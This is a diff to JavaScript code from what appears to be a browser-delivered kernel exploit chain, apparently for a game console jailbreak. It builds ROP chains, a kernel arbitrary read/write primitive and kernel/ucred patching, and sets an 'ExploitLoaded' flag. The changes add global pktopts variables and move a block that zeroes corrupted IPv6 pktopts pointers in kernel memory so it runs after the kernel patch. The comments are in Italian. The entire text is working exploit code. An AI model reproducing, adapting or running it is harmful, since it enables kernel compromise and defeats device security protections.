@@ -142,6 +142,10 @@ const num_clobbers = 8;
 let chain = null;
 var nogc = [];
 
+let m_pktopts = null;
+let w_pktopts = null;
+
+
 async function init() {
     await rop.init();
     chain = new Chain();
@@ -1469,19 +1473,8 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
      kmem.write64(w_rthdr_p, 0);
      log('corrupt pointers cleaned');
 
-try {
-    log("Pulizia puntatori pktopts...");
-    kmem.write64(m_pktopts.add(0x10), 0); // ip6po_pktinfo
-    kmem.write64(m_pktopts.add(0x18), 0); // ip6po_nhinfo
-    kmem.write64(m_pktopts.add(0x68), 0); // ip6po_rthdr
-
-    kmem.write64(w_pktopts.add(0x10), 0);
-    kmem.write64(w_pktopts.add(0x18), 0);
-    kmem.write64(w_pktopts.add(0x68), 0);
-    log("Pulizia completata.");
-} catch (e) {
-    log(`Errore nel pulire i puntatori pktopts: ${e}`);
-}
+m_pktopts=m_pktopts;
+    w_pktopts=w_pktopts;
 
     
     /*
@@ -1621,6 +1614,21 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     localStorage.ExploitLoaded="yes"
     sessionStorage.ExploitLoaded="yes";
    //alert("kernel exploit succeeded!");
+
+    try {
+    log("Pulizia puntatori pktopts...");
+    kmem.write64(m_pktopts.add(0x10), 0); // ip6po_pktinfo
+    kmem.write64(m_pktopts.add(0x18), 0); // ip6po_nhinfo
+    kmem.write64(m_pktopts.add(0x68), 0); // ip6po_rthdr
+
+    kmem.write64(w_pktopts.add(0x10), 0);
+    kmem.write64(w_pktopts.add(0x18), 0);
+    kmem.write64(w_pktopts.add(0x68), 0);
+    log("Pulizia pktopts completata.");
+} catch (e) {
+    log(`Errore nel pulire i pktopts: ${e}`);
+}
+
 }
 
 
